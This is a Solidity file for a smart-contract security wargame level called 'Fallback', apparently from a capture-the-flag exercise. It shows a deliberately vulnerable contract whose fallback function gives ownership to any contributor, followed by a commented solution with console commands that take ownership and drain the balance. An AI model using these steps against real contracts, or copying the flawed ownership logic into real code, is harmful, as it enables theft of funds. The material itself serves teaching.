// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: You will beat this level if you claim ownership of the contract & you reduce its balance to 0



// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  fallback() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}



//SOLUTION
//- make a contribution smaller than 0.001 ether (to pass the require checks in contribute function and then in fallback function)
//- Send any ETH amount to contract triggering fallback function and thereby gaining ownership
//- call withdraw function to drain the contract

// await contract.contribute.sendTransaction({value:toWei('0.0001'), from: player})		
// await sendTransaction({to: "0xC111F26edfD85158BF265A68ef5477669e860665", from: player, value: 100 })
// await contract.owner()